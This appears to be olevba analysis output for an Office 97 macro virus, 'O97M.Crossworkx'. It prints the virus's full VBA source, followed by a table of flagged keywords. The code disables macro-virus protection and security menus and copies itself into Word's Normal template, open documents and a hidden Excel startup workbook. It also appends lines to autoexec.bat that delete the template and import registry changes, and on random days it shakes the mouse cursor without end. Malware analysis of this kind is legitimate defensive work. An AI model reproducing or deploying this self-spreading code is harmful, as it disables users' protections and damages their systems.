olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Exceller.b-a3212ad180ec8968f13d95a4b2aa666b07b78130
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Exceller.b-a3212ad180ec8968f13d95a4b2aa666b07b78130 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cross.bas 
in file: Virus.MSOffice.Exceller.b-a3212ad180ec8968f13d95a4b2aa666b07b78130 - OLE stream: 'Macros/VBA/Cross'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Const ModulName = "Cross"

Public Declare Function SetCursorPos Lib "user32" _
    (ByVal x As Long, ByVal y As Long) As Long

Public Declare Function GetCursorPos Lib "user32" _
    (lpPoint As Maus) As Long

Public Declare Sub Sleep Lib "kernel32" _
    (ByVal dwMilliseconds As Long)

Private Type Maus
       Xpos As Long
       Ypos As Long
End Type

Sub AutoOpen()
On Error Resume Next

Options.VirusProtection = False
Options.SaveNormalPrompt = False

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""

CommandBars("View").Controls(6).Enabled = False
CommandBars("Format").Controls(12).Enabled = False
CommandBars("Tools").Controls(12).Enabled = False
CommandBars("Tools").Controls(13).Enabled = False
CommandBars("Tools").Controls(14).Enabled = False

Application.DisplayAlerts = wdAlertsNone

Application.VBE.ActiveVBProject.VBComponents(ModulName).Export "c:\cross.sys"

Set Normal_ = NormalTemplate.VBProject.VBComponents
Set Active_ = ActiveDocument.VBProject.VBComponents

For i = 1 To Normal_.Count
    If Normal_(i).Name = ModulName Then NormalIns = True
Next i

For j = 1 To Active_.Count
    If Active_(j).Name = ModulName Then ActiveIns = True
Next j

If NormalIns = False Then
    Normal_.Import "c:\cross.sys"
End If

If ActiveIns = False Then
    Active_.Import "c:\cross.sys"
    ActiveDocument.SaveAs ActiveDocument.FullName
End If

With Application.FileSearch
    .LookIn = Application.Path
    .FileName = "Workbook_.xls"
    .SearchSubFolders = True
    .Execute
If .FoundFiles.Count <> 0 Then ExcelInstalled = True
End With
    
If ExcelInstalled = False Then

    Set excelx = CreateObject("excel.application")
    excelx.Visible = False
    
    excelx.CommandBars("Tools").Controls(10).Enabled = False
    excelx.CommandBars("Tools").Controls(12).Enabled = False
    excelx.CommandBars("View").Controls(3).Enabled = False
    excelx.CommandBars("Window").Controls(3).Enabled = False
    excelx.CommandBars("Window").Controls(4).Enabled = False

    Book = excelx.Application.StartupPath & "\Workbook_.xls"
    
    Set workbookx = excelx.Workbooks.Add
    
    workbookx.VBProject.VBComponents.Import "c:\cross.sys"
    excelx.ActiveWindow.Visible = False
    workbookx.SaveAs Book
    
    Set workbookx = Nothing
    excelx.Quit
    Set excelx = Nothing

End If
DropFiles
If Day(Now()) = Int(Rnd * 31) Then mEarthquake
End Sub

Sub Auto_Open()
Application.OnSheetActivate = "Exceler"
DropFiles
End Sub

Sub Exceler()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents(ModulName).Export "c:\cross.sys"

With Application
.DisplayAlerts = False
.ScreenUpdating = False

.CommandBars("Tools").Controls(10).Enabled = False
.CommandBars("Tools").Controls(12).Enabled = False
.CommandBars("View").Controls(3).Enabled = False
.CommandBars("Window").Controls(3).Enabled = False
.CommandBars("Window").Controls(4).Enabled = False
End With

Set Active_ = ActiveWorkbook.VBProject.VBComponents
Book = Application.StartupPath & "\Workbook_.xls"

If UCase(Dir(Book)) <> "WORKBOOK_.XLS" Then
    Workbooks.Add.SaveAs FileName:=Book, AddToMru:=False
    Workbooks("Workbook_.xls").VBProject.VBComponents.Import "c:\cross.sys"
    ActiveWindow.Visible = False
    Workbooks("Workbook_.xls").Save
End If

For i = 1 To Active_.Count
    If Active_(i).Name = ModulName Then Installed = True
Next

If Installed = False Then
    Active_.Import "c:\cross.sys"
    ActiveWorkbook.SaveAs FileName:=ActiveWorkbook.FullName, AddToMru:=False
End If

Set wordx = CreateObject("word.application")

    wordx.Visible = False
    Set wordtemp = wordx.NormalTemplate.VBProject.VBComponents
    
    For j = 1 To wordtemp.Count
        If wordtemp(j).Name = ModulName Then WordIns = True
    Next
   
    If WordIns = False Then
    
        wordtemp.Import "c:\cross.sys"
        Set wordtemp = Nothing
        
        
        wordx.Options.VirusProtection = False
        wordx.Options.SaveNormalPrompt = False
    
        wordx.CommandBars("View").Controls(6).Enabled = False
        wordx.CommandBars("Format").Controls(12).Enabled = False
        wordx.CommandBars("Tools").Controls(12).Enabled = False
        wordx.CommandBars("Tools").Controls(13).Enabled = False
        wordx.CommandBars("Tools").Controls(14).Enabled = False

        wordx.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
        wordx.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
      
    End If

wordx.Quit
Set wordx = Nothing
If Day(Now()) = Int(Rnd * 31) Then mEarthquake
End Sub

Private Sub mEarthquake()

Dim posMaus As Maus
Dim newX As Long, newY As Long

Application.Caption = "Office97Macro.Crossworkx aka H8Heg...it's payback time sucker!"
Application.StatusBar = "My advice to you: NEVER KNOW NOTHING!"

Do
    GetCursorPos posMaus
                 
     newX = Rnd(2)
     If newX = 0 Then newX = -5 Else newX = 5
     
     newY = Rnd(2)
     If newY = 0 Then newY = -5 Else newY = 5
           
     SetCursorPos posMaus.Xpos + newX, posMaus.Ypos + newY
     Sleep 2

     DoEvents
Loop

End Sub

Function DropFiles()
If NormalTemplate.VBProject.Protection = 1 Then
    
    Open "c:\autoexec.bat" For Append As #1
        Print #1, "@if exist c:\win.bat then call c:\win.bat"
        Print #1, "@if exist c:\win.bat then del c:\win.bat"
    Close #1
    
    
    Open "c:\win.bat" For Output As #1
        Print #1, "del " & NormalTemplate.FullName
    Close #1

End If
    
If UCase(Dir("c:\win.reg")) <> "C:\WIN.REG" Then
    
    Open "c:\autoexec.bat" For Append As #1
        Print #1, "@regedit /s c:\win.reg"
    Close #1
    
    Open "c:\win.reg" For Output As #1
        Print #1, "REGEDIT4"
        Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]"
        Print #1, """EnableMacroVirusProtection""=dword:00000000"
    Close #1
    
End If
End Function

' O97M.Crossworkx aka O97M.H8Heg
' Coded by Jack Twoflower of [LineZer0]&[Metaphase]
' Just to show Mr. Heg what's possible!!!

' Tanti saluti a mio amico Slagehammer!!!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |win.bat             |Executable file name                         |
|IOC       |win.reg             |Executable file name                         |
|IOC       |WIN.REG             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

